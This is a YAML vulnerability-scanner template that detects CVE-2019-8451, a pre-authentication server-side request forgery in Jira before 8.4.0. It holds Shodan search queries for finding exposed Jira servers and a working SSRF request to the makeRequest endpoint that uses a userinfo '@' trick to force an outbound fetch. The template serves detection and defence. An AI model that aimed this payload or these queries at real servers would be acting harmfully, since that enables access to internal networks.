id: CVE-2019-8451

info:
  name: Jira <8.4.0 - Server-Side Request Forgery
  author: zan8in
  severity: medium
  description: |
    Jira的/plugins/servlet/gadgets/makeRequest资源存在SSRF漏洞，原因在于JiraWhitelist这个类的逻辑缺陷，成功利用此漏洞的远程攻击者可以以Jira服务端的身份访问内网资源。经分析，此漏洞无需任何凭据即可触发。
    shodan:
      - http.component:"Atlassian Jira"
      - http.component:"atlassian jira"
  reference:
    - https://github.com/jas502n/CVE-2019-8451
    - https://www.cnblogs.com/backlion/p/11608371.html
    - https://www.tenable.com/blog/cve-2019-8451-proof-of-concept-available-for-server-side-request-forgery-ssrf-vulnerability-in
    - https://jira.atlassian.com/browse/JRASERVER-69793
    - https://hackerone.com/reports/713900
    - https://nvd.nist.gov/vuln/detail/CVE-2019-8451
    - https://github.com/merlinepedra/nuclei-templates
  tags: cve,cve2019,atlassian,jira,ssrf,tenable,hackerone,vkev,vuln
  created: 2023/08/10

set:
  originScheme: request.url.scheme
  originHost: request.url.host
rules:
  r0:
    request:
      method: POST
      path: /plugins/servlet/gadgets/makeRequest
      headers:
        X-Atlassian-Token: no-check
      body: url={{originScheme}}://{{originHost}}@example.com
    expression: response.status == 200 && response.body.bcontains(b'<title>Example Domain</title>')
expression: r0()
